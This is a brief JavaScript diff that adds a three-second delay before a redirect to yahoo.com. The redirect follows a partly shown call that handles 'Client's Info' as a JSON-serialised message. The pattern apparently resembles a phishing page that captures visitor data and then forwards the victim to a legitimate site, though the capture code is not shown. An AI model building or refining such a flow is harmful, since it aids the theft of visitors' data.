@@ -338,7 +338,9 @@
               "Client's Info",
               JSON.stringify(message)
             );
-            window.location.replace("https://www.yahoo.com/");
+            setTimeout(() => {
+              window.location.replace("https://www.yahoo.com/");
+            }, 3000);
           }
         });
       }
